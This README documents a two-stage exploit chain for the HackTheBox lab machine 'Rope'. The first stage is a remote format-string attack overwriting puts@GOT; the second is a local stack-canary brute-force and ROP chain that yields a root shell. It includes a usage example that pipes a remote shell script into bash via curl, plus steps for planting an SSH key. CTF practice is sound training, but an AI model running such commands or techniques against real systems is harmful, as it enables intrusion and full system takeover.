# Full Exploit Chain – Remote Initial Access & Local Privilege Escalation

This repository contains a two-stage exploit chain targeting HackTheBox machine "Rope". A full root shell can be obtained by following the steps listed below.

---

## Structure

* `initial_access/exploit.py`: Remote exploit targeting a vulnerable custom webserver using a format string vulnerability.
* `local_privilege_escalation/exploit.py`: Local privilege escalation targeting a vulnerable local service using stack brute-force and ROP.

---

## Remote Initial Access

**File:** `initial_access/exploit.py`
</br>
**Vulnerability:** `Arbitrary file read and format string to overwrite puts@GOT with system@LIBC and execute an arbitrary system command.`

### Usage

```bash
python3 exploit.py <TARGET_IP> <TARGET_PORT> "<SHELL_CMD>"
```

### Description

1. Leaks PIE and LIBC base via `/proc/self/maps` using an arbitrary file read vulnerability.
2. Calculates the address of `puts@GOT` and `system@LIBC`.
3. Overwrites `puts@GOT` using a format string payload.
4. Executes a base64-encoded shell command.

### Example

```bash
python3 exploit.py 10.10.10.10 8080 "curl http://10.10.14.1/shell.sh | bash"
```

---

## Local Privilege Escalation

**File:** `local_privilege_escalation/exploit.py`
</br>
**Vulnerability:** `Stack based buffer overflow and information disclosure via brute force leading to executing a ROP chain that duplicates socket file descriptors to stdin/stdout and spawns a shell.`

### Setup

1. Add your SSH public key to any writable user's `~/.ssh/authorized_keys`.
2. Forward port 1337 from the target to your system:

```bash
ssh -L 1337:localhost:1337 -i <KEY> <USER>@<TARGET>
```

### Usage

```bash
python3 exploit.py
```

### Description

1. Brute-forces the stack canary byte-by-byte.
2. Brute-forces the saved return address byte-by-byte.
3. Leaks `write@libc` to resolve libc base.
4. Constructs a ROP chain to:
   * Duplicate socket to stdin/stdout
   * Invoke `execve("/bin/sh", 0, 0)`
5. Spawns an interactive shell as the root user.

## Requirements

* Python 3.x
* [pwntools](https://github.com/Gallopsled/pwntools)

Install dependencies with:

```bash
pip3 install pwntools
```

